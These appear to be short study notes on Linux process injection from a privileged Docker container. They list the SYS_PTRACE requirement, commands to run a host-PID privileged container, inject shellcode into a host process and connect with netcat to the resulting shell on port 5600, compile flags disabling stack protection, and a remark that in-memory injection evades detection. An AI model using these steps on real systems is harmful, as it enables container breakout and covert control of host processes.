# Linux Process Injection

- imapct
    - control other process and have same permission as the target process

- Breakout Privileged
    - all
    - actually SYS_PTRACE

- action
    
    (on host)
    - docker run --pid=host --privileged ubuntu:22.04 bash
    - docker cp inject 96f7f14e99ab2:/
    - sudo ./target
    - (in container)
    - ./inject $PID (target PID)
    - nc ip 5600
    
    
- inject and target compile command
    - gcc inject.c -o inject
    - gcc test.c -z execstack -o target

- notice:
    - inject shell code should be modify on different device
    - sample shell code run on linux x86/64 architecture and reflect shell on port 5600

- reference
    - https://0x00sec.org/t/linux-infecting-running-processes/1097

- other
    - since process injection run on memory it hard to be detect